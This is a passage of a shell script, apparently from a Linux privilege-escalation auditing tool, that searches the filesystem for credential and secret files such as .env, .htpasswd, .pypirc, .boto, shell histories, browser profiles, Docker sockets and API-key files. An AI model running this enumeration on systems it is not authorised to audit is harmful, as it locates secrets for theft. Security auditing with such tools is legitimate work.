  1257	  PSTORAGE_CACHE_VI=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.swp$|.*\.viminfo$" | sort | uniq | head -n 70)
  1258	  PSTORAGE_DOCKER=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "docker\.socket$|docker\.sock$|Dockerfile$|docker-compose\.yml$|dockershim\.sock$|containerd\.sock$|crio\.sock$|frakti\.sock$|rktlet\.sock$|\.docker$" | sort | uniq | head -n 70)
  1259	  PSTORAGE_FIREFOX=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "\.mozilla$|Firefox$" | sort | uniq | head -n 70)
  1260	  PSTORAGE_CHROME=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "google-chrome$|Chrome$" | sort | uniq | head -n 70)
  1261	  PSTORAGE_OPERA=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "com\.operasoftware\.Opera$" | sort | uniq | head -n 70)
  1262	  PSTORAGE_SAFARI=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "Safari$" | sort | uniq | head -n 70)
  1263	  PSTORAGE_AUTOLOGIN=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "autologin$|autologin\.conf$" | sort | uniq | head -n 70)
  1264	  PSTORAGE_FASTCGI=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "fastcgi_params$" | sort | uniq | head -n 70)
  1265	  PSTORAGE_FAT_FREE=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "fat\.config$" | sort | uniq | head -n 70)
  1266	  PSTORAGE_SHODAN=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "api_key$" | sort | uniq | head -n 70)
  1267	  PSTORAGE_CONCOURSE=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.flyrc$|concourse-auth$|concourse-keys$" | sort | uniq | head -n 70)
  1268	  PSTORAGE_BOTO=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.boto$" | sort | uniq | head -n 70)
  1269	  PSTORAGE_SNMP=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "snmpd\.conf$" | sort | uniq | head -n 70)
  1270	  PSTORAGE_PYPIRC=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.pypirc$" | sort | uniq | head -n 70)
  1271	  PSTORAGE_POSTFIX=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "postfix$" | sort | uniq | head -n 70)
  1272	  PSTORAGE_CLOUDFLARE=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.cloudflared$" | sort | uniq | head -n 70)
  1273	  PSTORAGE_HISTORY=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*_history.*$" | sort | uniq | head -n 70)
  1274	  PSTORAGE_HTTP_CONF=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "httpd\.conf$" | sort | uniq | head -n 70)
  1275	  PSTORAGE_HTPASSWD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.htpasswd$" | sort | uniq | head -n 70)
  1276	  PSTORAGE_LDAPRC=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.ldaprc$" | sort | uniq | head -n 70)
  1277	  PSTORAGE_ENV=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'example' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.env.*$" | sort | uniq | head -n 70)
  1278	  PSTORAGE_MSMTPRC=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.msmtprc$" | sort | uniq | head -n 70)
  1279	  PSTORAGE_INFLUXDB=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "influxdb\.conf$" | sort | uniq | head -n 70)
